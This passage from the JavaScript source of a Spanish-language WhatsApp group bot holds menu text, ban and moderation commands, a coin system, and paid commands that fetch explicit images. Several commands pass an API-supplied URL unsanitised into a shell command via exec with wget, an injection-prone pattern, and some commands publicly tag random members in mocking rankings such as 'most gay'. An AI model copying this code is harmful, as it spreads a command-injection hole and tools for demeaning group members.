*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}besar @*
*╟ ❒ ${prefix}patear @*
*╟ ❒ ${prefix}abrazar @*
*╟ ❒ ${prefix}palmaditas @*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣ADMINS*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}info*
*╟ ❒ ${prefix}ping*
*╟ ❒ ${prefix}notif*
*╟ ❒ ${prefix}todos*
*╟ ❒ ${prefix}tagall*
*╟ ❒ ${prefix}kick @*
*╟ ❒ ${prefix}chatlist*
*╟ ❒ ${prefix}getbio @*
*╟ ❒ ${prefix}linkgroup*
*╟ ❒ ${prefix}listadmin*
*╟ ❒ ${prefix}promote @*
*╟ ❒ ${prefix}antilink [1/0]*
*╟ ❒ ${prefix}hidetag (texto)*
*╟ ❒ ${prefix}antitrava [1/0]*
*╟ ❒ ${prefix}welcome [1/0]*
*╟ ❒ ${prefix}grupo [abrir/cerrar]*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣NSFW*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}nfswmenu*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣GAMES*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}gay*
*╟ ❒ ${prefix}reto*
*╟ ❒ ${prefix}slot*
*╟ ❒ ${prefix}lesbi*
*╟ ❒ ${prefix}juego*
*╟ ❒ ${prefix}ruleta*
*╟ ❒ ${prefix}charlie*
*╟ ❒ ${prefix}verdad*
*╟ ❒ ${prefix}apostar*
*╟ ❒ ${prefix}rankfeo*
*╟ ❒ ${prefix}tictactoe*
*╟ ❒ ${prefix}rankgay*
*╟ ❒ ${prefix}ranklindo*
*╟ ❒ ${prefix}ranksexy*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣CREADOR*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}ice*
*╟ ❒ ${prefix}box*
*╟ ❒ ${prefix}love*
*╟ ❒ ${prefix}toxic*
*╟ ❒ ${prefix}love2*
*╟ ❒ ${prefix}blood*
*╟ ❒ ${prefix}luxury*
*╟ ❒ ${prefix}dance*
*╟ ❒ ${prefix}bokeh*
*╟ ❒ ${prefix}text3d*
*╟ ❒ ${prefix}blood2*
*╟ ❒ ${prefix}warrior*
*╟ ❒ ${prefix}codetxt*
*╟ ❒ ${prefix}express*
*╟ ❒ ${prefix}vampire*
*╟ ❒ ${prefix}blackbird*
*╟ ❒ ${prefix}halloween*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣OTROS*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}perfil* ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}wame*
*╟ ❒ ${prefix}frases*
*╟ ❒ ${prefix}frases2*
*╟ ❒ ${prefix}piropos*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠ೋ━ೋ✧ೋ━ೋ┓*
*║        🌸Watame🌸*
*┗ೋ━ೋ✧ೋ━ೋ┛*`      
cnf.sendMessage(from, wew, image,{contextInfo: {forwardingScore : 0, isForwarded: false},sendEphemeral: true, caption:lzain})
     addFilter(from)
          break

case prefix+'start':
if (isBanned) return  reply(mess.banned)	     
if (!isRegistered) return reply(ind.noregis())
if (!isOwner) return reply(mess.only.ownerB)			  
reply(`*╭═┅╡🌸WATAME🌸╞┅═╮*\n*╟ ╳*\n*╟ ❒ Iniciando...!*\n*╟ ❒ Usa #menu para ver*\n        *el menú de opciones!*\n*╟ ╳*\n*┠ೋ━ೋ✧ೋ━ೋ┓*\n*║        ✨EN LINEA✨*\n*┗ೋ━ೋ✧ೋ━ೋ┛*`)
     addFilter(from)
          break
  
case prefix+'ban':
if (!isOwner) return reply(mess.only.ownerB)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Por favor etiqueta!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) return reply('etiqueta')
const Bb = [`${body.slice(6)}`]
										ban.push(`${Bb}@s.whatsapp.net`)		
            fs.writeFileSync('./database/json/banned.json', JSON.stringify(ban))
reply(`El numero ${body.slice(4)} ah sido baneado ya no podra utilizarme`)
addFilter(from)
          break

case prefix+ 'ranklindo':
          if (!isGroup) return reply(mess.only.group)
          if (!isRegistered) return reply(ind.noregis())
          	
          tuh = fs.readFileSync(`./stik/lindo.jpg`)
          jds = []
          const YDDY = groupMembers
          const JSJ = groupMembers
          const TAAT = groupMembers
          const SG = YDDY[Math.floor(Math.random() * YDDY.length)]           
          const SOOD = JSJ[Math.floor(Math.random() * JSJ.length)]
          const HDH = TAAT[Math.floor(Math.random() * TAAT.length)]
          AJ = `●❯────────────────❮●\nTop de los más lindos del grupo \n@${SG.jid.split('@')[0]} \n😳\n@${SOOD.jid.split('@')[0]}\n😘\n@${HDH.jid.split('@')[0]}\n●❯────────────────❮●`                  
          jds.push(SG.jid)
          jds.push(SOOD.jid)
          jds.push(HDH.jid)
          cnf.sendMessage(from, tuh, MessageType.image, { quoted: mek, caption: `${AJ}`, contextInfo: { forwardingScore: 1000, isForwarded: true , mentionedJid: jds}}) 
        addFilter(from)
          break

case prefix+ 'rankgay':
          if (!isGroup) return reply(mess.only.group)
          if (!isRegistered) return reply(ind.noregis())	
          
          tuh = fs.readFileSync(`./stik/gay.jpg`)
          jds = []
          const Z11 = groupMembers
          const U11 = groupMembers
          const T11 = groupMembers
          const F11 = Z11[Math.floor(Math.random() * Z11.length)]           
          const G22 = U11[Math.floor(Math.random() * U11.length)]
          const H33 = T11[Math.floor(Math.random() * T11.length)]
          D11 = `●❯────────────────❮●\nTop de los más gays del grupo 🌈\n@${F11.jid.split('@')[0]} \n🏳️‍🌈\n@${G22.jid.split('@')[0]}\n🏳️‍🌈\n@${H33.jid.split('@')[0]}\n●❯────────────────❮●`                  
          jds.push(F11.jid)
          jds.push(G22.jid)
          jds.push(H33.jid)
          cnf.sendMessage(from, tuh, MessageType.image, { quoted: mek, caption: `${D11}`, contextInfo: { forwardingScore: 1000, isForwarded: true , mentionedJid: jds}}) 
        addFilter(from)
          break

case prefix+ 'rankfeo':
          if (!isGroup) return reply(mess.only.group)
          if (!isRegistered) return reply(ind.noregis())	
          
          tuh = fs.readFileSync(`./stik/lindo.jpg`)
                    const YDDDY = groupMembers
          const JJSJ = groupMembers
          const TAAET = groupMembers
          const SSG = YDDDY[Math.floor(Math.random() * YDDDY.length)]           
          const SSOOD = JJSJ[Math.floor(Math.random() * JJSJ.length)]
          const HDDDH = TAAET[Math.floor(Math.random() * TAAET.length)]
          jds = []
          AJ = `●❯────────────────❮●\nTop de los mas feos del grupo\n@${SSG.jid.split('@')[0]} \n🥸\n@${SSOOD.jid.split('@')[0]}\n🤓\n@${HDDDH.jid.split('@')[0]}\n●❯────────────────❮●`                  
          jds.push(SSG.jid)
          jds.push(SSOOD.jid)
          jds.push(HDDDH.jid)
          cnf.sendMessage(from, tuh, MessageType.image, { quoted: mek, caption: `${AJ}`, contextInfo: { forwardingScore: 1000, isForwarded: true , mentionedJid: jds}}) 
        addFilter(from)
          break

case prefix+ 'ranksexy':
          if (!isGroup) return reply(mess.only.group)
          if (!isRegistered) return reply(ind.noregis())
	
          tuh = fs.readFileSync(`./stik/lindo.jpg`)
                    const Z111 = groupMembers
                              const U111 = groupMembers
          const T111 = groupMembers
          const F111 = Z111[Math.floor(Math.random() * Z111.length)]  
          const G222 = U111[Math.floor(Math.random() * U111.length)]
          const H333 = T111[Math.floor(Math.random() * T111.length)]          
          jds = []
          D11 = `●❯────────────────❮●\nTop de los mas sexis del grupo\n@${F111.jid.split('@')[0]} \n💃\n@${G222.jid.split('@')[0]}\n🕺\n@${H333.jid.split('@')[0]}\n●❯────────────────❮●`                  
          jds.push(F111.jid)
          jds.push(G222.jid)
          jds.push(H333.jid)
          cnf.sendMessage(from, tuh, MessageType.image, { quoted: mek, caption: `${D11}`, contextInfo: { forwardingScore: 1000, isForwarded: true , mentionedJid: jds}}) 
        addFilter(from)
          break

case prefix+'trabajar':
           if (isBanned) return  reply(mess.banned)
           if (!isRegistered) return reply(ind.noregis())
           cnf.updatePresence(from, Presence.composing)                   			      		
           addKoinUser(sender, 200)
           reply(`❝ Trabajaste y Ganaste 200 Coins ❞`)
        addFilter(from)
          break

'Para volver a activar los comandos NSFW solo para admins utiliza: (if (!isNsfw) return reply(mess.nsfwoff))'

case prefix+'nsfwmenu':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
if (!isBotGroupAdmins) return reply(mess.only.Badmin)	  
               cnf.sendMessage(from, nsfwmenu(prefix, sender), text, {quoted: mek})
            addFilter(from)
          break

case prefix+'idiomas':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
               cnf.sendMessage(from, idiomas(prefix, sender), text, {quoted: mek})
            addFilter(from)
          break
  
case prefix+'avatar':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
		  
			anu = await axios.get('https://nekos.life/api/v2/img/avatar')
				avatars = await getBuffer(anu.data.url)
				cnf.sendMessage(from, avatars, image, {quoted: mek, caption: 'Linda foto no?' })
			addFilter(from)
          break
			    
case prefix+'antilink':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
if (!isGroup) return reply(`「 ❗ 」ESTE COMANDO SOLO PUEDE SER USADO EN GRUPOS`)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
					if (args.length < 1) return reply('Escribe 1 para activar')

					if (Number(args[0]) === 1) {

						if (isAntiLink) return reply('Ya está activo')

						antilink.push(from)

						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))

						reply('Activado correctamente✔️')

						cnf.sendMessage(from,`*🚫Antilink ha sido ativado, si envían enlaces serán eliminados del grupo🚫*`, text)

					} else if (Number(args[0]) === 0) {

						if (!isAntiLink) return reply('*Desactivado*')

						var ini = antilink.indexOf(from)

						antilink.splice(ini, 1)

						fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))

						reply('Desactivar correctamente ✔️')

					} else {

						reply('Escribe 1 para activar o 0 para desactivar')

					}

					addFilter(from)
          break
 
case prefix+'anime':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
	  
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            cnf.sendMessage(from,media,image,{quoted:mek,caption:'Aquí tienes 💕🦈'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            addFilter(from)
          break

case prefix+'pussy':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const uaangkapolurru = checkATMuser(sender)
const jmomoio = [`${uaangkapolurru}`]
if (jmomoio < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/pussy')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
						reply('Se te cobraron 30 coins')
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break
case prefix+'pussyimage':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const uaangkaukayrru = checkATMuser(sender)
const jmokuro = [`${uaangkaukayrru}`]
if (jmokuro < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

  pusiimg = await axios.get('https://nekos.life/api/v2/img/pussy_jpg')
			bufpusy = await getBuffer(pusiimg.data.url)
				cnf.sendMessage(from, bufpusy, MessageType.image, {quoted: mek})
						reply('Se te cobraron 30 coins')
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
          break

         	   case prefix+'creador':
         	   if (isBanned) return  reply(mess.banned)
                  cnf.sendMessage(from, {displayname: "Confu", vcard: vcard}, MessageType.contact, { quoted: mek})
                            cnf.sendMessage(from, 'El es mi creador 😖👉👈 re secsi ᕙ( : ˘ ∧ ˘ : )ᕗ',MessageType.text, { quoted: mek} )
					addFilter(from)
          break    


case prefix+'solo':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
       const uaangkaurrkiu = checkATMuser(sender)
const jmokoio = [`${uaangkaurrkiu}`]
if (jmokoio < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			anu = await axios.get('https://nekos.life/api/v2/img/solog')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
						reply('Se te cobraron 30 coins')
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break
					
case prefix+'yuri':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const uaangkakoiurru = checkATMuser(sender)
const jmokiuo = [`${uaangkakoiurru}`]
if (jmokiuo < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			yuriz = await axios.get('https://nekos.life/api/v2/img/yuri')
			bupyuri = await getBuffer(yuriz.data.url)
			cnf.sendMessage(from, bupyuri, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
          break

case prefix+'futa':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const futanari = checkATMuser(sender)
const futas = [`${futanari}`]
if (futas < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			futa1 = await axios.get('https://nekos.life/api/v2/img/futanari')
			futa2 = await getBuffer(futa1.data.url)
			cnf.sendMessage(from, futa2, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
          break

case prefix+'oppai':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const oppai1 = checkATMuser(sender)
const oppai2 = [`${oppai1}`]
if (oppai2 < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/boobs')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('E-error ⊙﹏⊙')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				reply('Se te cobraron 30 coins')
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break

	case prefix+'anal':
	if (isBanned) return  reply(mess.banned)
	if (!isRegistered) return reply(ind.noregis())
	if (!isBotGroupAdmins) return reply(mess.only.Badmin)
	 const anall = checkATMuser(sender)
const anali = [`${anall}`]
if (anali < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/anal')
